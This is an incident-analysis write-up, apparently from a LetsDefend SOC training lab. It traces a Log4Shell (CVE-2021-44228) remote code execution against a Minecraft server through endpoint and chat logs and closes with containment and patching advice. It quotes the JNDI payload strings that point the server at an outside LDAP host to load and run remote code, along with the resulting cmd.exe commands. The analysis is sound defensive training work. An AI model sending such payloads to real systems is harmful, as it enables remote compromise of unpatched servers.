# SOC161 - Log4j RCE Exploit (CVE-2021-44228)



## Executive Summary

On December 11, 2021, the Security Operations Center (SOC) received a critical alert for a successful Remote Code Execution (RCE) attack on an internal **Minecraft Server** (192.168.10.69). The investigation confirmed that an external attacker exploited the **Log4Shell vulnerability (CVE-2021-44228)** by sending a malicious JNDI lookup string through the in-game chat. The vulnerable Log4j library, used by the Java-based server, parsed the string, leading to the execution of arbitrary commands. Endpoint logs confirm the attacker successfully spawned `cmd.exe` to run commands, proving a full system compromise. This is a **True Positive** critical incident requiring immediate containment and full incident response.

## Incident Details

The initial alert was triggered by the suspicious execution of `calc.exe` by a Java application:

<img width="1510" height="525" alt="image" src="https://github.com/user-attachments/assets/218d36ec-7e5e-49e3-a49c-4da1292a5e4d" />

| | |
| :--- | :--- |
| **Date of Incident** | December 11, 2021 |
| **Attacker IP** | 151.135.112.161 (Player IP) |
| **Attacker Staging Server** | 18.217.235.130 (LDAP Server) |
| **Destination Host** | Minecraft Server (192.168.10.69) |
| **Attack Type** | Remote Code Execution (RCE) via CVE-2021-44228 |
| **Malicious Payload** | `${jndi:ldap://18.217.235.130:1389/exploit}` |
| **Case Link** | [View Full Case on LetsDefend.io](https://app.letsdefend.io/case-management/casedetail/sohankanna/111) |

## Investigation and Analysis

### 1. Endpoint Analysis - Confirmation of RCE

The investigation began at the endpoint where the alert was generated. An analysis of the process history on the **Minecraft Server** host revealed a clear sequence of malicious command execution, with the parent process being the server's Java archive (`paper-1.12.2-1618.jar`).

<img width="1076" height="180" alt="image" src="https://github.com/user-attachments/assets/d0f754fe-4661-4ebd-814a-58c31114849f" />

*   `java.exe` launches the server.
*   `cmd.exe /c calc.exe` is executed. This is a common proof-of-concept to verify RCE.
*   `cmd.exe /c start echo Log4j Exploit Test Success` is executed, further confirming the attacker's intent and success.

The `AV Action: Allowed` indicates that endpoint defenses did not stop this behavior-based threat.

### 2. Application Log Analysis - Root Cause Identification

To find the initial access vector, the investigation pivoted to the application logs of the Minecraft server itself. The logs provided a definitive timeline and the exact payload used.

<img width="905" height="248" alt="image" src="https://github.com/user-attachments/assets/5ceb7ff1-c36f-43f3-b425-3b1d1269798e" />

1.  **[10:37:57]** A user named `testuser23` connects from the IP address `151.135.112.161`.
2.  **[10:40:16]** The user `testuser23` sends a chat message containing the Log4j payload: `${jndi:ldap://18.217.235.130:1389/exploit2}`.
3.  **[10:40:33]** A second payload is sent: `${jndi:ldap://18.217.235.130:1389/exploit}`.

The vulnerable server logged these chat messages. The Log4j library interpreted the `${jndi:...}` string, causing the server to connect to the attacker's LDAP server (`18.217.235.130`). This server then responded with a malicious Java class, which the Minecraft server executed, resulting in the command execution seen on the endpoint.

## Skills and Tools Utilized

*   **Tools Used:** SIEM, EDR / Endpoint Security, Application Log Files
*   **Skills Demonstrated:** RCE Analysis, Log4j Exploit Recognition (CVE-2021-44228), Root Cause Analysis, Correlating Endpoint and Application Logs.

## Playbook Solution: Incident Classification

*   **Initial Access Method:** **Exploit Public-Facing Application.**
*   **Persistence / Privilege Escalation:** **None** observed in this initial stage, but must be investigated.
*   **Was the Attack Successful?** **Yes.** Confirmed RCE with command execution.
*   **Does the device need to be isolated?** **Yes.** The host is fully compromised.
*   **Incident Classification:** **True Positive.**

## Conclusion and Recommendations

The alert for SOC161 was a **true positive** for a critical and successful RCE attack. The attacker leveraged the Log4Shell vulnerability (CVE-2021-44228) in the server's outdated Log4j library to gain complete control over the application process. The **Minecraft Server** is compromised and poses an immediate threat to the network.

**Recommendations:**

1.  **CONTAINMENT - Isolate Host Immediately:** Disconnect the **Minecraft Server** (192.168.10.69) from the network to prevent lateral movement and any further C2 communication.
2.  **ESCALATE - Activate Full Incident Response Protocol:** Immediately escalate to the Tier 2/Incident Response (IR) team for a full forensic investigation.
3.  **INVESTIGATION:** The IR team must analyze the host for persistence mechanisms, credential theft, and any signs of lateral movement originating from this host since the time of compromise.
4.  **ERADICATION & RECOVERY:** The server must be completely rebuilt from a trusted, known-good source. Do not attempt to patch the running system.
5.  **VULNERABILITY REMEDIATION:** Before redeploying, the Minecraft server software and all its dependencies, specifically the Log4j library, must be updated to a version that is patched against CVE-2021-44228.
6.  **BLOCK INDICATORS:** Block both the attacker's player IP (`151.135.112.161`) and the malicious LDAP staging server (`18.217.235.130`) at the network firewall.
